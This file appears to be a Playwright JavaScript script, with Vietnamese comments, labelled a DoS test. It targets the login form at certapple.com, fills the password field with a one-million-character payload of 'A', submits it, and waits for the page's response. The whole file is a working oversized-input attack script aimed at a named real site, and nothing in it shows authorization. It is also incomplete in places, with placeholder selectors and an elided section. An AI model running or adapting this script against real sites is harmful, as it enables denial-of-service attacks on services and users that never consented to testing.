// attack_script_dos_test.js (Version 3 - Handle hidden form)

const { chromium } = require('playwright');

// --- Cấu hình ---
const TARGET_URL = 'https://certapple.com';
const EMAIL_TEST = 'dos-tester@test.com';
const PAYLOAD_SIZE = 1000000;
const PAYLOAD_CHARACTER = 'A';
// --- Kết thúc cấu hình ---

(async () => {
  const browser = await chromium.launch();
  const context = await browser.newContext();
  const page = await context.newPage();

  try {
    const payload = PAYLOAD_CHARACTER.repeat(PAYLOAD_SIZE);

    console.log(`::group::Truy cập ${TARGET_URL}...`);
    await page.goto(TARGET_URL, { waitUntil: 'networkidle' });
    console.log('✅ Trang đã tải xong.');
    console.log('::endgroup::');

    console.log('::group::Bắt đầu gửi payload lớn...');
    console.log(`Sẽ thử tấn công với email '${EMAIL_TEST}' và một payload dài ${PAYLOAD_SIZE.toLocaleString()} ký tự.`);
    console.log('------------------------------------');

    try {
      // --- BƯỚC MỚI: MÔ PHỎNG HÀNH ĐỘNG MỞ FORM ĐĂNG NHẬP ---
      // Giả sử có một nút "Đăng nhập" cần được nhấn để form hiện ra.
      // Bạn cần thay thế selector này cho đúng với trang web.
      const loginButtonSelector = 'a:has-text("Đăng nhập")'; // <<== THAY ĐỔI SELECTOR NÀY
      
      console.log(`Đang tìm và nhấn vào nút "${loginButtonSelector}" để hiển thị form...`);
      await page.locator(loginButtonSelector).click();
      
      // Chờ một chút để form có thời gian xuất hiện sau khi click
      await page.waitForTimeout(1000); // Chờ 1 giây
      console.log('✅ Form đăng nhập nên đã được hiển thị.');
      // --- KẾT THÚC BƯỚC MỚI ---

      // 1. Tìm và điền vào ô email
      await page.locator('#username').fill(EMAIL_TEST);

      // 2. Tìm và điền PAYLOAD LỚN vào ô mật khẩu
      await page.locator('#password').fill(payload);
      
      // 3. Nhấn nút Đăng nhập
      await page.locator('#login_certapple button[type="submit"]').click();

      // ... (Phần còn lại của script giữ nguyên) ...
      await page.waitForLoadState('networkidle', { timeout: 60000 });
      // ...
      
    } catch (e) {
      console.error(`Error: Lỗi trong quá trình tương tác với trang: ${e.message}`);
      process.exit(1);
    }
    
    console.log('------------------------------------');
    console.log('✅✅✅ KIỂM TRA HOÀN TẤT. Vui lòng xem kết quả log ở trên.');
    console.log('::endgroup::');

  } catch (error) {
    console.error(`::error::Đã xảy ra lỗi nghiêm trọng: ${error}`);
    process.exit(1);
  } finally {
    await browser.close();
  }
})();
